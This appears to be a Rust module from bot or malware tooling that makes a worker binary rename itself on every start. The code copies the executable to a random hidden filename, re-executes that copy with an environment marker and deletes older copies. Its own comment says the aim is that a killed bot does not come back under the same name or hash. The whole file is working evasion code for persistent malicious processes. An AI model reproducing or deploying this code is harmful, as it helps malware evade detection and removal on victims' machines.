//! Per-start binary renaming.
//!
//! Each worker start copies itself to a random filename in the same directory,
//! re-executes that copy, and prunes older copies. The process name and on-disk
//! file change every launch, so a killed bot does not come back under the same
//! name or hash path. `AF_NO_MORPH=1` disables it, `AF_MORPHED=1` marks the
//! already-morphed child.

use std::{
    ffi::OsString,
    fs,
    path::{Path, PathBuf},
};

use rand::{rngs::OsRng, RngCore};

/// Maximum previous copies kept beside the current one.
const KEEP: usize = 2;

fn stem(path: &Path) -> OsString {
    let name = path
        .file_stem()
        .map(|value| value.to_string_lossy().into_owned())
        .unwrap_or_else(|| "agentd".into());
    name.trim_start_matches('.').into()
}

fn extension(path: &Path) -> Option<OsString> {
    path.extension().map(|value| value.to_os_string())
}

/// Picks a random sibling filename for `exe`.
pub fn next_name(exe: &Path) -> PathBuf {
    let stem = stem(exe);
    let name = format!(".{}-{:08x}", stem.to_string_lossy(), OsRng.next_u32());
    let mut target = exe.with_file_name(name);
    if let Some(extension) = extension(exe) {
        target.set_extension(extension);
    }
    target
}

/// Copies `exe` to a random sibling and returns the new path.
pub fn stage_copy(exe: &Path) -> std::io::Result<PathBuf> {
    let target = next_name(exe);
    fs::copy(exe, &target)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&target, fs::Permissions::from_mode(0o755))?;
    }
    prune(exe);
    Ok(target)
}

fn prune(exe: &Path) {
    let Some(directory) = exe.parent() else {
        return;
    };
    let stem = stem(exe);
    let prefix = format!(".{}-", stem.to_string_lossy());
    let Ok(entries) = fs::read_dir(directory) else {
        return;
    };
    let mut copies: Vec<(PathBuf, std::time::SystemTime)> = entries
        .filter_map(Result::ok)
        .filter(|entry| entry.file_name().to_string_lossy().starts_with(&prefix))
        .filter_map(|entry| {
            let modified = entry.metadata().ok()?.modified().ok()?;
            Some((entry.path(), modified))
        })
        .collect();
    copies.sort_by_key(|(_, modified)| *modified);
    for (path, _) in copies.iter().rev().skip(KEEP) {
        let _ = fs::remove_file(path);
    }
}

/// Whether morphing is enabled for this start.
pub fn enabled() -> bool {
    std::env::var_os("AF_MORPHED").is_none() && std::env::var_os("AF_NO_MORPH").is_none()
}

/// Replaces the current process with the staged copy. Returns false if the exec
/// path is unavailable and the caller should continue in place.
pub fn reexec(target: &Path) -> bool {
    let args: Vec<OsString> = std::env::args_os().skip(1).collect();
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        let _ = std::process::Command::new(target)
            .args(&args)
            .env("AF_MORPHED", "1")
            .exec();
        true
    }
    #[cfg(not(unix))]
    {
        match std::process::Command::new(target)
            .args(&args)
            .env("AF_MORPHED", "1")
            .spawn()
        {
            Ok(mut child) => {
                let _ = child.wait();
                std::process::exit(0);
            }
            Err(_) => false,
        }
    }
}
